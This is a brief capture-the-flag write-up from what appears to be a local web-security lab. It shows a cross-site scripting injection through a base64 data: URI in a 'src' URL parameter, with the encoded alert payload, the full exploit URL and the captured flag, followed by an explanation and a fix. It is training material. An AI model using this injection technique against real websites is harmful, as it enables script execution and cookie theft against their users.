# situation

## http://192.168.56.101/?page=media&src=nsa

The URL contains a src field, so we can assume that it loads documents from the server that are located in src
It is explained in a XSS Using Code Encoding data section of this site: https://owasp.org/www-community/attacks/xss/


I am trying to encode <script>alert('coucou')</script> in base 64 and it gives me : PHNjcmlwdD5hbGVydCgnY291Y291Jyk8L3NjcmlwdD4=

whit url : http://192.168.56.101/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnY291Y291Jyk8L3NjcmlwdD4=

flag : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
# problem
 that allows an attacker to inject malicious code (usually JavaScript) into a web page visited by a user. This malicious code can then be executed by the user's browser, allowing the attacker to steal sensitive information, such as authentication cookies, or perform malicious actions on the user's browser.


# solution
By avoiding directly inserting the data from the URL into the page, and by passing IDs that would point to images (in the DB)